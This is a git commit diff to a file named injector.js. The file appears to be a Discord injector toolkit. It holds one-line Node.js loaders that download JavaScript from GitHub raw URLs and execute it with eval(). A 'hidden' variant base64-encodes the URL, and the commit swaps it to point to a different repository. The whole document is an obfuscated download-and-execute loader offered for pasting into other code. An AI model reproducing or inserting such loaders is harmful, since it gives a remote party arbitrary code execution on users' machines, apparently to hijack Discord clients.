41e3d658d04ad81f3ea4dcf0c26a32d10c98507d
BARHOM1 <92695969+BARHOM1@users.noreply.github.com>
2023-05-09 03:48:23 +0300

    Update injector.js

--- injector.js
+++ injector.js
@@ -13,4 +13,4 @@ require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1
 //one line
 require('https').get('https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js', (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
 //one line + hidden
-require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NhbXVlbE1ldS9pbmplY3Rvci1kaXNjb3JkL21haW4vaW5kZXguanM=', 'base64').toString(), (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
+require('https').get(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JBUkhPTTEvYnJvYnIvbWFpbi9maWxlLmpz', 'base64').toString(), (res) => { var data = ""; res.on('data', (dat) => data += dat.toString()); res.on('end', () => eval(data)); })
